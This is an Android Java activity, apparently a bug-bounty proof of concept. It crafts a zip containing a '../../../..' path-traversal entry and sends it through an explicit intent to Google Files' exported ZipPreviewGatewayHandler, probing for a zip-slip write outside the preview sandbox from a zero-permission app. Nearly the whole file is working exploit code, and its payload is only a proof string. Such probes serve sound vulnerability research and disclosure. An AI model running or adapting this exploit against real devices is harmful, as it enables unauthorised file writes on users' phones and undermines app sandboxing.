package com.vrp.zeroperm;

import android.app.Activity;
import android.content.ComponentName;
import android.content.ContentValues;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Environment;
import android.provider.MediaStore;
import android.util.Log;

import java.io.OutputStream;
import java.util.zip.ZipEntry;
import java.util.zip.ZipOutputStream;

// com.google.android.apps.nbu.files (Google Files) exports ZipPreviewGatewayHandler
// (VIEW + application/zip, no permission) which routes through the shared TikTok nav
// gateway. Testing whether previewing an attacker-supplied zip containing a
// "../../../.." path-traversal entry name causes a write outside the expected
// preview/extraction sandbox (classic zip-slip), using Files' own storage access.
// The zip is created and owned by THIS zero-perm app via a direct MediaStore insert
// (no permission needed under scoped storage for an app's own inserted content), so
// it can grant read access to it without needing broader storage permissions.
public class FilesZipSlipActivity extends Activity {
    private static final String T = "FILES_ZIPSLIP";

    @Override
    protected void onCreate(Bundle b) {
        super.onCreate(b);
        Log.w(T, "=== Google Files ZipPreviewGatewayHandler zip-slip probe ===");
        Log.w(T, "UID=" + android.os.Process.myUid() + " (ZERO permissions)");

        try {
            ContentValues cv = new ContentValues();
            cv.put(MediaStore.Downloads.DISPLAY_NAME, "evil_zeroperm.zip");
            cv.put(MediaStore.Downloads.MIME_TYPE, "application/zip");
            cv.put(MediaStore.Downloads.RELATIVE_PATH, Environment.DIRECTORY_DOWNLOADS);
            Uri zipUri = getContentResolver().insert(MediaStore.Downloads.EXTERNAL_CONTENT_URI, cv);
            Log.w(T, "[OWNED URI] " + zipUri);

            OutputStream out = getContentResolver().openOutputStream(zipUri);
            ZipOutputStream zos = new ZipOutputStream(out);
            zos.putNextEntry(new ZipEntry("normal.txt"));
            zos.write("hello".getBytes());
            zos.closeEntry();
            zos.putNextEntry(new ZipEntry("../../../../../../data/local/tmp/zipslip_pwned.txt"));
            zos.write("ZIPSLIP_PROOF_CONTENT".getBytes());
            zos.closeEntry();
            zos.close();
            Log.w(T, "[BUILT] zip with traversal entry written");

            Intent intent = new Intent(Intent.ACTION_VIEW);
            intent.setDataAndType(zipUri, "application/zip");
            intent.setComponent(new ComponentName(
                "com.google.android.apps.nbu.files",
                "com.google.android.apps.nbu.files.gateway.zip.ZipPreviewGatewayHandler"));
            intent.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION);
            intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            startActivity(intent);
            Log.w(T, "[SENT] VIEW intent dispatched to ZipPreviewGatewayHandler");
        } catch (Throwable e) {
            Log.w(T, "[FAILED] " + e);
        }
        finish();
    }
}
